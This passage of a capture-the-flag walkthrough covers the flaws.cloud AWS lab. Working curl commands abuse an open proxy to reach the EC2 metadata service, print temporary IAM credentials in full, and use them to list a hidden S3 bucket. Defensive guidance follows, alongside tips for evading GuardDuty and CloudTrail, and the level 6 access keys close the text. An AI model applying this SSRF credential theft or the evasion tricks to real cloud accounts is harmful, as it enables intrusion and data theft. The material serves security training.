‚îî‚îÄ$ curl -i http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/google.com/
```
```
HTTP/1.1 301 Moved Permanently
Location: http://www.google.com/
Server: nginx/1.10.0 (Ubuntu)
```

This is mostly the same result but the server now is nginx 1.10.0. This time the EC2 instance made the request to Google and forwarded the result to us.

Using [icanhazip.com](https://icanhazip.com/), a web site that simply returns your IP address to you, we can further confirm this. Compare these two requests:
```
‚îî‚îÄ$ curl icanhazip.com
132.83.234.10

‚îî‚îÄ$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/icanhazip.com/
35.165.182.7
```
The direct request returns your public IP address whereas the proxied request returns the public IP address of the proxy, which is `35.165.182.7`. You can verify this proxy IP address with ‚Äú`dig`‚Äù:
```
‚îî‚îÄ$ dig 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud @9.9.9.9
```
```
4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud. 300 IN CNAME ec2-35-165-182-7.us-west-2.compute.amazonaws.com.
ec2-35-165-182-7.us-west-2.compute.amazonaws.com. 43200 IN A 35.165.182.7
```
Thus we now know for sure we can use this EC2 instance to make requests on our behalf and we control the host name. To the site we request, it will be as if the EC2 instance does the request. What can we do with that?

#### Accessing Instance Metadata

EC2 instances on AWS have access to a so-called [metadata service](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html). The service is made available on a link-local IPv4 address ([see RFC 3927](https://tools.ietf.org/html/rfc3927)) at `169.254.169.254`. Accordingly it is only available from the EC2 instance itself and can never be requested from any other host.

Did the creator of the proxy block access to link-local IPv4 addresses? We should find this out. Go to http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254 and what you get is this:
```
‚îî‚îÄ$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/
1.0
2007-01-19
...
2018-09-24
latest
```
This looks like the entry page for the metadata service. We have access!

The metadata service exposes plenty of configuration data about the instance. Start at [169.254.169.254/latest](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest) and follow the (non-clickable) links to explore. For example, at [169.254.169.254/latest/dynamic/instance-identity/document/](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/dynamic/instance-identity/document/) you will find the following high-level summary of the configuration:
```
{
  "privateIp" : "172.31.41.84",
  "devpayProductCodes" : null,
  "marketplaceProductCodes" : null,
  "version" : "2017-09-30",
  "instanceId" : "i-05bef8a081f307783",
  "billingProducts" : null,
  "instanceType" : "t2.micro",
  "availabilityZone" : "us-west-2a",
  "kernelId" : null,
  "ramdiskId" : null,
  "accountId" : "975426262029",
  "architecture" : "x86_64",
  "imageId" : "ami-7c803d1c",
  "pendingTime" : "2017-02-12T22:29:24Z",
  "region" : "us-west-2"
}
```

Another place for valuable information is the [user data](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html#user-data-api-cli). AWS lets you specify a script that runs when an instance boots up. You could see the script at [169.254.169.254/latest/user-data](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/user-data/), but for this instance there is none. In other cases you may find hard-coded credentials in this script file.

Most importantly though you should check for [IAM instance profile](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_switch-role-ec2_instance-profiles.html) credentials. Instead of hard-coding passwords into EC2 instances AWS allows you to assign an instance profile to a machine. This machine can then request temporary credentials with corresponding permissions from the metadata service. Credentials are only valid for a short time (a few hours at most) and never touch any disk.

This means that we should be able to ask to proxy to get these credentials for us. The manual request is a two-step procedure. First, find the instance profile name at [169.254.169.254/latest/meta-data/iam/info/](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/info/), which will look like this:
```
{
  "Code" : "Success",
  "LastUpdated" : "2019-11-12T15:26:22Z",
  "InstanceProfileArn" : "arn:aws:iam::975426262029:instance-profile/flaws",
  "InstanceProfileId" : "AIPAIK7LV6U6UXJXQQR3Q"
}
```
Now we know it is called ‚Äúflaws‚Äù. Fetch temporary credentials for the role from [169.254.169.254/latest/meta-data/iam/security-credentials/flaws](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/) and you should see something like this:
```
{
  "Code" : "Success",
  "LastUpdated" : "2019-11-12T15:26:38Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA6GG7PSQG2DUIX6WK",
  "SecretAccessKey" : "nqHFBc6JioWLn97VcuR2M3JYDHoaMfsuc1oKyasH",
  "Token" : "IQoJb3JpZ2luX2VjEPD//////////wEaCXVzLXdlc3QtMiJGMEQCIG1yD/Vn/GDjnsCiO/Z0fpBMb0683hKDRtchraQcILQEAiAejtgTNX34u9vtT3fOqgyrNK2bvVMJWC0BMg1RxT4Y8SrSAggZEAAaDDk3NTQyNjI2MjAyOSIMlCGMWOpWm2U+5ItZKq8Ct4hi0KsQvsXCfRZs6M5uSUcBsh6voTztyBRx/gz03VmntxcTVHQZ0A9OwVYqzwo5OPzrauGqWAvzoT4NfcYVhNL1aWezbfXASLlLntO2m3RUFzoJUxMTHA3MM0myFuSVpW4DQBh+uDHCBwaxODYp4lAIbLBWE5+AVFLo0VdCVMUI7Syp181BmJiOWG62VuP6Mo5GHYvnWej7X2i7xt8FK7glanlayMpxto0a5KQsQI0NlLXKthvplOE9vMXKluVhBDj6PEvWYfE2rrVqmordfmqWkJbzs/Xu3XO0QbH/O2wbisOp3Rh+hQ72vAGGyQNUyy/j4iDXvkSJf6XE0+MiCiDLIkzZO3QbhHogTLQruChDF4hFagZJpa3vzfuKe+a4867KwjPYy6TqSsQS6vz/MJ6eq+4FOs4CZqC9yNSdhvUV4feei8iDC4PLQc9kanGY/74wYTo6jhynACeOZaxTbK3lHPwOtR4EDTdHmvtZ85ayXJ0zmjVndR0lB/Mt7LAQx8yXNpT23u6bK4XdN928nxF6QvrOHzuteHrSGKLcZOsQZZ/G5kovD6o3eeJ++1lymBNPtzN3/FaeVMgPly7gMbbCRqW/Q65Zw7tTYbKVLQJAfAh19ukfnuCNDMJexaSaMWM5l+djbD+TNw9A3cm+GAb6j6yYAv21+EnBAuUxOISI5CCI+9wRfKGHu/vgSLVt1uwvkHnFBFMcvVfcTYg8kQIEGZTQnxOw/sDr/32PugpmXjBc3OdLajgucrKkUdhaHP/XIA8nEYy8yTQHZguw9tsXaox4wz/dQKMzJsT+6mGdmMGyOnKMZmlW9ZqqXgHC57fi01IhjcamrxZr9E216qNTvsYS2g==",
  "Expiration" : "2019-11-12T21:42:31Z"
}
```
Nice, we have a key and a session token.

#### Using the credentials

So we have credentials now. Lets try to list the bucket. To use the credentials, you could source them into your environment:
```
 # export AWS_ACCESS_KEY_ID=ASIA6GG7PSQG2DUIX6WK
 # export AWS_SECRET_ACCESS_KEY=nqHFBc6JioWLn97VcuR2M3JYDHoaMfsuc1oKyasH
 # export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEPD//////////wEaCXVzLXdlc3QtMiJGMEQCIG1yD/Vn/GDjnsCiO/Z0fpBMb0683hKDRtchraQcILQEAiAejtgTNX34u9vtT3fOqgyrNK2bvVMJWC0BMg1RxT4Y8SrSAggZEAAaDDk3NTQyNjI2MjAyOSIMlCGMWOpWm2U+5ItZKq8Ct4hi0KsQvsXCfRZs6M5uSUcBsh6voTztyBRx/gz03VmntxcTVHQZ0A9OwVYqzwo5OPzrauGqWAvzoT4NfcYVhNL1aWezbfXASLlLntO2m3RUFzoJUxMTHA3MM0myFuSVpW4DQBh+uDHCBwaxODYp4lAIbLBWE5+AVFLo0VdCVMUI7Syp181BmJiOWG62VuP6Mo5GHYvnWej7X2i7xt8FK7glanlayMpxto0a5KQsQI0NlLXKthvplOE9vMXKluVhBDj6PEvWYfE2rrVqmordfmqWkJbzs/Xu3XO0QbH/O2wbisOp3Rh+hQ72vAGGyQNUyy/j4iDXvkSJf6XE0+MiCiDLIkzZO3QbhHogTLQruChDF4hFagZJpa3vzfuKe+a4867KwjPYy6TqSsQS6vz/MJ6eq+4FOs4CZqC9yNSdhvUV4feei8iDC4PLQc9kanGY/74wYTo6jhynACeOZaxTbK3lHPwOtR4EDTdHmvtZ85ayXJ0zmjVndR0lB/Mt7LAQx8yXNpT23u6bK4XdN928nxF6QvrOHzuteHrSGKLcZOsQZZ/G5kovD6o3eeJ++1lymBNPtzN3/FaeVMgPly7gMbbCRqW/Q65Zw7tTYbKVLQJAfAh19ukfnuCNDMJexaSaMWM5l+djbD+TNw9A3cm+GAb6j6yYAv21+EnBAuUxOISI5CCI+9wRfKGHu/vgSLVt1uwvkHnFBFMcvVfcTYg8kQIEGZTQnxOw/sDr/32PugpmXjBc3OdLajgucrKkUdhaHP/XIA8nEYy8yTQHZguw9tsXaox4wz/dQKMzJsT+6mGdmMGyOnKMZmlW9ZqqXgHC57fi01IhjcamrxZr9E216qNTvsYS2g==
```
Confirm that it worked by checking your caller identity. It should be a role with the same name as the instance profile, with the instance ID as session name:
```
‚îî‚îÄ$ aws sts get-caller-identity
```
```
{
    "UserId": "AROAI3DXO3QJ4JAWIIQ5S:i-05bef8a081f307783",
    "Account": "975426262029",
    "Arn": "arn:aws:sts::975426262029:assumed-role/flaws/i-05bef8a081f307783"
}
```
Now the final part is easy. List the bucket:

```
‚îî‚îÄ$ aws s3api list-objects-v2 --bucket level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud --region us-west-2
```
```
{
    "Contents": [
        ...
        {
            "Key": "ddcc78ff/index.html",
            "LastModified": "2017-03-03T04:36:25.000Z",
            "ETag": "\"e144e5208ec070129e9e0bd9369967b0\"",
            "Size": 2782,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "index.html",
            "LastModified": "2017-02-27T02:11:07.000Z",
            "ETag": "\"6b0ffa72702b171487f97e8f443599ee\"",
            "Size": 871,
            "StorageClass": "STANDARD"
        }
    ]
}
```
Up there you can see that we found the secret subdirectory ‚Äúddcc78ff‚Äù. We can now go to the [hidden page](http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/) and find ourselves in level 6.


### Lesson learned
The IP address 169.254.169.254 is a magic IP in the cloud world. AWS, Azure, Google, DigitalOcean and others use this to allow cloud resources to find out metadata about themselves. Some, such as Google, have additional constraints on the requests, such as requiring it to use `Metadata-Flavor: Google` as an HTTP header and refusing requests with an `X-Forwarded-For` header. AWS has recently created a new IMDSv2 that requires special headers, a challenge and response, and other protections, but many AWS accounts may not have enforced it. If you can make any sort of HTTP request from an EC2 to that IP, you'll likely get back information the owner would prefer you not see.

#### Examples of this problem

- [Nicolas Gr√É¬©goire](https://twitter.com/Agarri_FR) discovered that prezi allowed you point their servers at a URL to include as content in a slide, and this allowed you to point to 169.254.169.254 which provided the access key for the EC2 intance profile ([link](https://engineering.prezi.com/prezi-got-pwned-a-tale-of-responsible-disclosure-ccdc71bb6dd1?gi=c0ec39b6236a)). He also found issues with access to that magic IP with [Phabricator](https://hackerone.com/reports/53088) and [Coinbase](https://hackerone.com/reports/53004). 

A similar problem to getting access to the IAM profile's access keys is access to the EC2's user-data, which people sometimes use to pass secrets to the EC2 such as API keys or credentials.

### Avoiding this mistake
Ensure your applications do not allow access to 169.254.169.254 or any local and private IP ranges. Additionally, ensure that IAM roles are restricted as much as possible. 

#### The flaw

The main problem in this level is clearly the proxy not blocking requests to the metadata service. By default, a proxy intended for websites should probably be set up such that it blocks at least link-local ([RFC 3927](https://tools.ietf.org/html/rfc3927)) as well as private ([RFC 1918](https://tools.ietf.org/html/rfc1918)) IP addresses, maybe with carefully added exceptions depending on the use case.

Still, you might argue that this is a rather special use case. Not many people set up proxies like this one. From the application development point of view though any server-side request forgery ([SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)) vulnerability may be exploitable in the same way. So, besides the fact that you should carefully check the config of your WAFs and other proxies, another learning is to realize how bad SSRF can be if you host your stuff on EC2. The [HackerOne tutorial on SSRF](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF) specifically mentions EC2 metadata as a reason why SSRF can have big impact.

#### Prevent misconfigurations and SSRF

Obviously not making a mistake will always fix it but puts considerable responsibilities on admins and developers. Only one mistake is needed to create a problem. Still, fewer problems means it is harder to find one, so give your best. Give your best, write secure code and test applications as well as all networking tools for this. Critical components are everything that performs outbound requests on the users behalf and is somehow configurable. For example there could be a webhooks feature with SSRF.

Besides crossing your fingers you could also firewall outgoing connections. This can help but only if the legitimate applications running on the machine do not need the connection. For example, in this level the instance may need access to the instance profile credentials (why else would it have an instance profile) so you can‚Äôt just block access to it. In other cases it may help though.

#### IMDSv2

There is a brand-new instance metadata service which is way more secure than the traditional one, [announced](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/) only a few days ago. Official documentation is [here](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html). By default both versions run in parallel but it is possible to disable the old version explicitly.

With this new version you have to set up a session with the metadata service before you can retrieve anything. You do so by requesting ‚Äúhttp://169.254.169.254/latest/api/token‚Äù using the PUT method. It returns a token that needs to be in the ‚ÄúX-aws-ec2-metadata-token‚Äù header for all subsequent GET requests against the metadata service.

In our case it would have stopped the attack had version 1 been disabled. The proxy will only do GET requests for us so there is no way to send a PUT for the login. (Presumably) there is also no way to brute-force the token it would have returned. As a result we would not be able to extract credentials.

For example, my (silly) try to make the proxy do a PUT can be seen below. Issuing a PUT against Google returns a complaint about an invalid method:
```
‚îî‚îÄ$ curl -i -X PUT -d 'param=value' http://google.com
HTTP/1.1 405 Method Not Allowed
Allow: GET, HEAD
...
```
Trying to send this through the proxy returns just a 403:
```
‚îî‚îÄ$ curl -i -X PUT -d 'param=value' http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/http://google.com
HTTP/1.1 403 Forbidden
...
```

#### Least privilege

When you are done with the above then assume that all of it does not help and your credentials will get disclosed. It often requires some effort to design permissions tailored to the application using it. Still, it is the only way to limit the blast radius of a disclosure.

The CapitalOne hack is a great example for this. In an effort to present evidence for a hack, the indictment mentions the fact that the WAF security account listed S3 buckets even though - under normal circumstances - it never does ([page 7](https://www.justice.gov/usao-wdwa/press-release/file/1188626/download)). This not only indicates unauthorized access, it is also a good example for credentials that have more permissions than they need. If the WAF never does it it should not be allowed to do it. In this case it was, maybe because it was just easier to give access to all of S3 than to specifically check what exactly is needed.

#### IAM IP constrains

Further assuming an attacker got credentials and the permissions (whatever they are) do allow doing harm. What else can we do to protect us? One thing would be to add IP restrictions to your IAM policies. My personal experience is that AWS is not really designed for this and it can be clumsy to set up but it does stop many attacks.

A lesser known feature of IAM is that it allows you to specify conditions. A policy will only take effect if the conditions are met ([AWS docs on condition keys](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-keys.html)). One such condition is that the public IP address of the entity making the API request has to be in a certain IP range. Consider the IAM policy below as an example. This would deny all actions performed by the IAM user ‚Äúsome-user‚Äù unless they originate from IP ‚Äú1.2.3.4‚Äù:
```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Deny",
      "Principal": { "AWS": "arn:aws:iam::account-id:user/some-user" },
      "Action": "*",
      "Condition": {
        "NotIpAddress": {
          "aws:SourceIp": [ "1.2.3.4/32" ]
        }
      }
    }
  ]
}
```

More details can be found in the [knowledge base](https://aws.amazon.com/premiumsupport/knowledge-center/iam-restrict-calls-ip-addresses/). Prepare for hard-to-debug problems if you do on large scale. AWS services sometimes use other services on your behalf. The source IP of these requests will not be yours but that of the machine this AWS service is operated on. Thus things may fail, apparently for no reason. For example, [AWS Athena](https://aws.amazon.com/athena/), a serverless version of [Presto](https://prestodb.io/), will access S3 on your behalf to execute queries on your S3 data. Requests to the Athena API will originate from your IP. But follow-up requests to the S3 API, while using your credentials, will originate from the Presto cluster operated by AWS.

For the example in this level you could add a condition to allow using the credentials only from the public IP address of the EC2 instance (you may want to add an [Elastic IP](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/elastic-ip-addresses-eip.html) to ensure it does not change on a reboot). Such a restriction would make it much harder for us to use the credentials from elsewhere, particularly if we do not know about the restriction. Note that if we do, we may attempt to use the proxy for AWS API access via the EC2 machine. It probably works but looks like quite some work to me (if you successfully did it let me know!). At least with SSRF it may often be impossible to do.

#### Detection and alerting

Finally, if we can‚Äôt prevent it, we should at least know about unauthorized use of credentials. Early detection allows us to deactivate access credentials before serious harm is done. We need alerts and AWS has much to offer in regards to that. Imho the most important services are GuardDuty and CloudTrail.

#### GuardDuty

First and foremost, there is an AWS service called [GuardDuty](https://aws.amazon.com/guardduty/) which watches your account for suspicious behavior. Among other things one of the features is to detect EC2 instance credential use from any host does not have a known EC2 address. Thus, while it would not stop the attack, you would at least receive a warning about suspicious behaviour (e.g., via email). You would receive an [UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_unauthorized.html#unauthorized11) finding and get the IP of the attacker.

However, as an attacker it is quite easy to avoid detection by this GuardDuty rule. You can use stolen credentials literally from any EC2 machine on this earth. Just don‚Äôt use your laptop. Fire up an attack machine. That is all it takes. An detailed example for this evasion technique can be found on [Nick Frichette‚Äôs blog](https://frichetten.com/blog/hijack-iam-roles-and-avoid-detection).

As a side note: don‚Äôt use Kali, Parrot or Pentoo either for your requests. Not even if you run them on EC2. If you do, remember to patch your tools like the AWS CLI and SDKs. The reason is that they expose operating system details to AWS in each request in the user agent. GuardDuty has [rules](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_pentest.html#pentest1) to alert when typical hacker operating systems are used. It is [easy to change the user agent](https://www.thesubtlety.com/post/patching-boto3-useragent/) to something normal.

#### CloudTrail

Second, there is a service called [CloudTrail](https://aws.amazon.com/cloudtrail/) which is capable of logging all requests made to the AWS API that somehow relate to your account (actually much of GuardDuty is built on this service). Clever defenders could use it to inspect how credentials are typically used and build alerts for unusual behaviour. For example, above we verified our identity by [calling get-caller-identity](https://docs.aws.amazon.com/cli/latest/reference/sts/get-caller-identity.html), an endpoint of the Security Token Service API. If the EC2 instance normally does not do this it would be a good indicator for compromise so see such a call. Filer for ‚ÄúeventName‚Äù = ‚ÄúGetCallerIdentity‚Äù in CloudTrail to see it.

As an attacker, the only way to avoid detection then is to either use (guess) only legitimate calls, or to call APIs that do not support CloudTrail yet (A nice trick described on [rhinosecuritylabs.com](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/)). Amazon maintains a list of brand-new services without CloudTrail support [here](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html). For example, at the time of writing [Amazon Connect](https://aws.amazon.com/connect/) is not supported. To see our IAM identity without ‚Äúget-caller-identity‚Äù we could issue a request against this API and - assuming it is unauthorized - the error message contains our identity:
```
‚îî‚îÄ$ aws connect describe-user --user-id abc --instance-id 123
```
```
An error occurred (AccessDeniedException) when calling the DescribeUser operation: User: arn:aws:sts::975426262029:assumed-role/flaws/i-05bef8a081f307783 is not authorized ...
```

No entry in CloudTrail would appear that could be alerted on. Knowing the name of a role, you my be able to guess what it is good for and do follow-up calls.

#### Conclusion

We saw how exploitation of proxy or web application vulnerabilities can lead to disclosure of AWS credentials and how attackers can then leverage these credentials to exfiltrate data. The example of CapitalOne shows that issues like that are a real problem. The workflow is pretty straightforward and, unless sophisticated logging is in place, attackers can pretty much just poke at the AWS API until they find something they have access to. The fact that public clouds have public APIs plays into the attackers hands here.

Multiple things can be done to mitigate the risk:

- Write secure application code and proper configuration so that credentials don‚Äôt leak (i.e., do a lot of testing)
- Harden the EC2 instance metadata service to make it hard to exploit a flaw (i.e., disable IMDSv1)
- Follow the principle of least privilege and add IP or VPC constraints when you design IAM policies
- Use AWS loggings and alerting services like GuardDuty and CloudTrail to detect misuse early so that you have time to react ()


--------------------

# Level 6

For this final challenge, you're getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account.

Access key ID: AKIAJFQ6E7BY57Q3OBGA
Secret: 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

--------------------
#### Resourcs:
- Flaws.cloud: http://flaws.cloud
- AWS CLI: https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html
- Grayhatwarefare: https://buckets.grayhatwarfare.com
- AWS Bucket Dump: https://github.com/jordanpotti/AWSBucketDump
- Worst S3 Hacks: https://www.bitdefender.com/blog/businessinsights/worst-amazon-breaches/
